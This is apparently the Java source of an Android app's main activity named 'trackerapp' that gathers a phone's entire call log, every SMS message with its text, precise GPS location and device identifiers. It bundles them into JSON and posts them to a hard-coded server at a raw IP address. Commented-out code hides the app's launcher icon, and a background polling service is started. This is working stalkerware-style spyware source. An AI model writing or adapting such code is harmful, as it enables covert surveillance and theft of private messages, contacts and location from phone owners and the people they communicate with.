package com.youhuan.trackerapp;

import android.Manifest;
import android.app.ActivityManager;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.location.LocationManager;
import android.net.Uri;
import android.provider.CallLog;
import android.provider.ContactsContract;
import android.support.annotation.NonNull;
import android.support.v4.app.ActivityCompat;
import android.support.v7.app.AppCompatActivity;
import android.os.Bundle;
import android.util.Log;
import android.view.View;
import android.widget.Button;
import android.widget.Toast;

import com.baidu.location.BDLocation;
import com.baidu.location.BDLocationListener;
import com.baidu.location.LocationClient;
import com.baidu.location.LocationClientOption;
import com.baidu.mapapi.SDKInitializer;
import com.baidu.mapapi.map.BitmapDescriptorFactory;
import com.baidu.mapapi.map.MyLocationConfiguration;
import com.joker.api.Permissions4M;
import com.okhttplib.HttpInfo;
import com.okhttplib.OkHttpUtil;
import com.okhttplib.annotation.RequestType;
import com.okhttplib.callback.Callback;

import org.json.JSONObject;

import java.io.IOException;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.List;

public class MainActivity extends AppCompatActivity {

    private Button mBtnCall, mBtnSms, mBtnLocation, mBtnPost;
    private LocationClient mlocationClient;
    private String mLocationStr = "";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        Button btnRuning = (Button) findViewById(R.id.btn_server_runing);
        btnRuning.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                //判断服务是否在运行
                if (!isServiceWork(MainActivity.this, "com.youhuan.trackerapp.PollingService")) {
                    //开启服务
//                    Intent s = new Intent(MainActivity.this, PollingService.class);
//                    MainActivity.this.startService(s);
                    Log.e("----------->", "服务没有在运行！");
                } else {
                    Log.e("----------->", "服务在运行！");
                }
            }
        });

        Button btnRun = (Button) findViewById(R.id.btn_server_run);
        btnRun.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                //运行服务
                Intent s = new Intent(MainActivity.this, PollingService.class);
                MainActivity.this.startService(s);
            }
        });

        Button btnStop = (Button) findViewById(R.id.btn_server_stop);
        btnStop.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                //停止服务
                Intent s = new Intent(MainActivity.this, PollingService.class);
                MainActivity.this.stopService(s);
            }
        });

//        PackageManager pm = getPackageManager();
//        pm.setComponentEnabledSetting(getComponentName(), PackageManager.COMPONENT_ENABLED_STATE_DISABLED_USER, PackageManager.DONT_KILL_APP);
//
//
//
//        mBtnCall = (Button) findViewById(R.id.get_all_call);
//        mBtnCall.setOnClickListener(new View.OnClickListener() {
//            @Override
//            public void onClick(View view) {
//                for (Call c : getCall()) {
//                    Log.e("通话记录＝>", "内容：" + c.toString());
//                }
//            }
//        });
//
//        mBtnSms = (Button) findViewById(R.id.get_all_sms);
//        mBtnSms.setOnClickListener(new View.OnClickListener() {
//            @Override
//            public void onClick(View view) {
//                for (Sms s : getSms()) {
//                    Log.e("所有短信＝>", "内容：" + s.toString());
//                }
//            }
//        });
//
//        mBtnLocation = (Button) findViewById(R.id.get_all_location);
//        mBtnLocation.setOnClickListener(new View.OnClickListener() {
//            @Override
//            public void onClick(View view) {
//                getLocation();
//            }
//        });
//
//        mBtnPost = (Button) findViewById(R.id.get_all_post);
//        mBtnPost.setOnClickListener(new View.OnClickListener() {
//            @Override
//            public void onClick(View view) {
//                buildData();
//            }
//        });
    }

    /**
     * 判断某个服务是否正在运行的方法
     *
     * @param mContext
     * @param serviceName 是包名+服务的类名（例如：net.loonggg.testbackstage.TestService）
     * @return true代表正在运行，false代表服务没有正在运行
     */
    public boolean isServiceWork(Context mContext, String serviceName) {
        boolean isWork = false;
        ActivityManager myAM = (ActivityManager) mContext
                .getSystemService(Context.ACTIVITY_SERVICE);
        List<ActivityManager.RunningServiceInfo> myList = myAM.getRunningServices(100);
        if (myList.size() <= 0) {
            return false;
        }
        int size = myList.size();
        for (int i = 0; i < size; i++) {
            String mName = myList.get(i).service.getClassName().toString();
            if (mName.equals(serviceName)) {
                isWork = true;
                break;
            }
        }
        return isWork;
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[]
            grantResults) {
        Permissions4M.onRequestPermissionsResult(MainActivity.this, requestCode, grantResults);
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
    }

    //获取全部通话记录
    private List<Call> getCall() {
        List<Call> calls = new ArrayList<>();
        Cursor cs;
        if (ActivityCompat.checkSelfPermission(MainActivity.this, Manifest.permission.READ_CALL_LOG)
                != PackageManager.PERMISSION_GRANTED) {
            ActivityCompat.requestPermissions(MainActivity.this,
                    new String[]{Manifest.permission.READ_CALL_LOG}, 1000);

        }
        cs = MainActivity.this.getContentResolver().query(CallLog.Calls.CONTENT_URI, //系统方式获取通讯录存储地址
                new String[]{
                        CallLog.Calls.CACHED_NAME,  //姓名
                        CallLog.Calls.NUMBER,    //号码
                        CallLog.Calls.TYPE,  //呼入/呼出(2)/未接
                        CallLog.Calls.DATE,  //拨打时间
                        CallLog.Calls.DURATION,   //通话时长
                }, null, null, CallLog.Calls.DEFAULT_SORT_ORDER);
        int i = 0;
        if (cs != null && cs.getCount() > 0) {
            Date date = new Date(System.currentTimeMillis());
            SimpleDateFormat simpleDateFormat = new SimpleDateFormat("yyyy-MM-dd");
            String date_today = simpleDateFormat.format(date);
            for (cs.moveToFirst(); (!cs.isAfterLast()) && i < 1000; cs.moveToNext(), i++) {
                String callName = cs.getString(0);  //名称
                String callNumber = cs.getString(1);  //号码
                //如果名字为空，在通讯录查询一次有没有对应联系人
                if (callName == null || callName.equals("")) {
                    String[] cols = {ContactsContract.PhoneLookup.DISPLAY_NAME};
                    //设置查询条件
                    String selection = ContactsContract.CommonDataKinds.Phone.NUMBER + "='" + callNumber + "'";
                    Cursor cursor = MainActivity.this.getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                            cols, selection, null, null);
                    int nameFieldColumnIndex = cursor.getColumnIndex(ContactsContract.PhoneLookup.DISPLAY_NAME);
                    if (cursor.getCount() > 0) {
                        cursor.moveToFirst();
                        callName = cursor.getString(nameFieldColumnIndex);
                    }
                    cursor.close();
                }
                //通话类型
                int callType = Integer.parseInt(cs.getString(2));
                String callTypeStr = "";
                switch (callType) {
                    case CallLog.Calls.INCOMING_TYPE:
                        callTypeStr = "呼入";
                        break;
                    case CallLog.Calls.OUTGOING_TYPE:
                        callTypeStr = "呼出";
                        break;
                    case CallLog.Calls.MISSED_TYPE:
                        callTypeStr = "未接听";
                        break;
                    default:
                        //其他类型的，例如新增号码等记录不算进通话记录里，直接跳过
                        Log.i("ssss", "" + callType);
                        i--;
                        continue;
                }
                //拨打时间
                SimpleDateFormat sdf = new SimpleDateFormat("yyyy-MM-dd");
                Date callDate = new Date(Long.parseLong(cs.getString(3)));
                String callDateStr = sdf.format(callDate);
                if (callDateStr.equals(date_today)) { //判断是否为今天
                    sdf = new SimpleDateFormat("HH:mm");
                    callDateStr = sdf.format(callDate);
                } else if (date_today.contains(callDateStr.substring(0, 7))) { //判断是否为当月
                    sdf = new SimpleDateFormat("dd");
                    int callDay = Integer.valueOf(sdf.format(callDate));

                    int day = Integer.valueOf(sdf.format(date));
                    if (day - callDay == 1) {
                        callDateStr = "昨天";
                    } else {
                        sdf = new SimpleDateFormat("MM-dd");
                        callDateStr = sdf.format(callDate);
                    }
                } else if (date_today.contains(callDateStr.substring(0, 4))) { //判断是否为当年
                    sdf = new SimpleDateFormat("MM-dd");
                    callDateStr = sdf.format(callDate);
                }

                //通话时长
                int callDuration = Integer.parseInt(cs.getString(4));
                int min = callDuration / 60;
                int sec = callDuration % 60;
                String callDurationStr = "";
                if (sec > 0) {
                    if (min > 0) {
                        callDurationStr = min + "分" + sec + "秒";
                    } else {
                        callDurationStr = sec + "秒";
                    }
                }

                /**
                 * callName 名字
                 * callNumber 号码
                 * callTypeStr 通话类型
                 * callDateStr 通话日期
                 * callDurationStr 通话时长
                 * 请在此处执行相关UI或存储操作，之后会查询下一条通话记录
                 */
                Log.i("Msg", "callName" + callName);
                Log.i("Msg", "callNumber" + callNumber);
                Log.i("Msg", "callTypeStr" + callTypeStr);
                Log.i("Msg", "callDateStr" + callDateStr);
                Log.i("Msg", "callDurationStr" + callDurationStr);
                Call call = new Call();
                call.setId(0);
                call.setDuration(callDurationStr);
                call.setNickname(callName);
                call.setTell(callNumber);
                call.setTime(callDateStr);
                call.setType(callTypeStr);
                calls.add(call);
            }
        }


        return calls;
    }

    //获取全部短信
    private List<Sms> getSms() {
        List<Sms> sms = new ArrayList<>();

        ContentResolver cr = getContentResolver();
        Cursor cursor = cr.query(Uri.parse("content://sms/"), null, null, null, null);
//        StringBuffer buffter=new StringBuffer();
        SimpleDateFormat simpleDateFormat = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
        while (cursor.moveToNext()) {
            String address = cursor.getString(cursor.getColumnIndex("address"));//获取短信的号码
            String date = simpleDateFormat.format(new Date(cursor.getLong(cursor.getColumnIndex("date"))));//获取短信的日期
            String body = cursor.getString(cursor.getColumnIndex("body"));//获取短信内容
            int type = cursor.getInt(cursor.getColumnIndex("type"));//获取类型，看是否是接收还是发送
            String typeStr = "";
            if (type == 1) {
                typeStr = "接收";
            } else if (type == 2) {
                typeStr = "发送";
            } else {
                typeStr = null;
            }

            Sms s = new Sms();
            s.setId(0);
            s.setTell(address);
            s.setNickname("");
            s.setTime(date);
            s.setContent(body);
            s.setType(typeStr);
            sms.add(s);
        }

        return sms;
    }

    //获取位置
    private void getLocation() {
        SDKInitializer.initialize(getApplicationContext());
        mlocationClient = new LocationClient(getApplicationContext());
        mlocationClient.registerLocationListener(new MyLocationListener());
        initLocation();
        mlocationClient.start();
    }

    private void initLocation() {
        LocationClientOption option = new LocationClientOption();
        //设置坐标类型
        option.setCoorType("bd09ll");
        //设置是否需要地址信息，默认为无地址
        option.setIsNeedAddress(true);
        //设置是否打开gps进行定位
        option.setOpenGps(true);
        //设置扫描间隔，单位是毫秒 当<1000(1s)时，定时定位无效
        int span = 1000;
        option.setScanSpan(span);
        option.setLocationMode(LocationClientOption.LocationMode.Hight_Accuracy);//高精度模式
        mlocationClient.setLocOption(option);
    }

    /**
     * 判断GPS是否开启，GPS或者AGPS开启一个就认为是开启的
     *
     * @return true 表示开启
     */
    public boolean isOPen() {
        LocationManager locationManager
                = (LocationManager) MainActivity.this.getSystemService(Context.LOCATION_SERVICE);
        // 通过GPS卫星定位，定位级别可以精确到街（通过24颗卫星定位，在室外和空旷的地方定位准确、速度快）
        boolean gps = locationManager.isProviderEnabled(LocationManager.GPS_PROVIDER);
        // 通过WLAN或移动网络(3G/2G)确定的位置（也称作AGPS，辅助GPS定位。主要用于在室内或遮盖物（建筑群或茂密的深林等）密集的地方定位）
        boolean network = locationManager.isProviderEnabled(LocationManager.NETWORK_PROVIDER);
        if (gps || network) {
            return true;
        }

        return false;
    }

    public class MyLocationListener implements BDLocationListener {

        @Override
        public void onReceiveLocation(BDLocation bdLocation) {
            String type = "";
            if (bdLocation.getLocType() ==
                    BDLocation.TypeGpsLocation) {
                type = "GPS";
            } else if (bdLocation.getLocType() == BDLocation.TypeNetWorkLocation) {
                type = "网络";
            }

            String locationStr = "定位方式：" + type + " 位置：" + bdLocation.getCountry() + "  " + bdLocation.getProvince()
                    + "  " + bdLocation.getCity() + "  " + bdLocation.getDistrict() +
                    "  " + bdLocation.getStreet();
            mLocationStr = bdLocation.getAddrStr();
            Log.e("定位：", "定位结果：" + mLocationStr);
        }

        @Override
        public void onConnectHotSpotMessage(String s, int i) {

        }
    }

    private String buildData() {
        String data = "";
        getLocation();
        Thread thread = new Thread(new Runnable() {
            @Override
            public void run() {
                try {
                    Thread.sleep(5000);

                    //构造通话记录数据
                    StringBuffer callStr = new StringBuffer();
                    callStr.append("[");
                    List<Call> calls = getCall();
                    int clen = calls.size();
                    for (int i = 0; i < clen; i++) {
                        JSONObject callJson = new JSONObject();
                        callJson.put("tell", calls.get(i).getTell());
                        callJson.put("type", calls.get(i).getType());
                        callJson.put("time", calls.get(i).getTime());
                        callJson.put("duration", calls.get(i).getDuration());
                        String nickname = "";
                        if (calls.get(i).getNickname() != null) {
                            nickname = calls.get(i).getNickname();
                        }
                        callJson.put("nickname", nickname);
                        callStr.append(callJson.toString() + ",");
                    }
                    String cStr = callStr.toString();
                    cStr = cStr.substring(0, cStr.length() - 1);
                    cStr = cStr + "]";
                    if (cStr.length() < 2) {
                        cStr = "[]";
                    }

                    //构造短信数据
                    StringBuffer smsStr = new StringBuffer();
                    smsStr.append("[");
                    List<Sms> smsList = getSms();
                    int slen = smsList.size();
                    for (int j = 0; j < slen; j++) {
                        JSONObject smsJson = new JSONObject();
                        smsJson.put("tell", smsList.get(j).getTell());
                        smsJson.put("content", smsList.get(j).getContent());
                        smsJson.put("type", smsList.get(j).getType());
                        smsJson.put("time", smsList.get(j).getTime());
                        smsJson.put("nickname", smsList.get(j).getNickname());
                        smsStr.append(smsJson.toString() + ",");
                    }
                    String sStr = smsStr.toString();
                    sStr = sStr.substring(0, sStr.length() - 1);
                    sStr = sStr + "]";
                    if (sStr.length() < 2) {
                        sStr = "[]";
                    }

                    JSONObject mainJson = new JSONObject();
                    mainJson.put("phone_no", SystemUtil.getSystemModel());//手机型号
                    mainJson.put("machineCode", SystemUtil.getUniqueID(MainActivity.this));//机器码
                    mainJson.put("position", mLocationStr);//当前位置
                    mainJson.put("base_msg", SystemUtil.getDeviceBrand() +
                            "  " + SystemUtil.getSystemModel() +
                            "  " + SystemUtil.getSystemVersion());//基础信息
                    mainJson.put("sms", "");//短信   废弃
                    mainJson.put("_call", "");//电话  废弃
                    mainJson.put("newSms", 987654321);//短信集合*###NewSMS###*
                    mainJson.put("newCall", 887654321);//通话记录集合*###NewCALL###*
                    String mainStr = mainJson.toString();

//                    int sindex = mainStr.indexOf("newSms");
//                    sindex = sindex + 4;
//                    String sH = mainStr.substring(0, sindex);
//                    String sE = mainStr.substring(sindex, mainStr.length() - 1);
//                    mainStr = sH + sStr + sE;
//
//                    int cindex = mainStr.indexOf("newCall");
//                    cindex = cindex + 4;
//                    String cH = mainStr.substring(0, cindex);
//                    String cE = mainStr.substring(cindex, mainStr.length() - 1);
//
//                    mainStr = cH + cStr + cE;

                    mainStr = mainStr.replace("987654321", sStr);
                    mainStr = mainStr.replace("887654321", cStr);

                    Log.e("------->", mainStr);
                    doPost(mainStr);

                } catch (Exception e) {
                    Log.e("-->", "EX:" + e.getMessage());
                }
            }
        });
        thread.start();
        return data;
    }

    private void doPost(String json) {

        OkHttpUtil.getDefault(MainActivity.this).doAsync(
                HttpInfo.Builder()
                        .setUrl("http://111.230.27.114/Tracker/public/api/Affair/insertMessage")
                        .setRequestType(RequestType.POST)//设置请求方式
                        .addParam("Data", json)//添加接口参数
                        .build(),
                new Callback() {
                    @Override
                    public void onFailure(HttpInfo info) throws IOException {
                        String result = info.getRetDetail();
                        Log.e("--doPost-->", "异步请求失败:" + result);
                    }

                    @Override
                    public void onSuccess(HttpInfo info) throws IOException {
                        String result = info.getRetDetail();
                        Log.e("--doPost-->", "异步请求成功:" + result);
                        mlocationClient.stop();

                    }
                });
    }
}
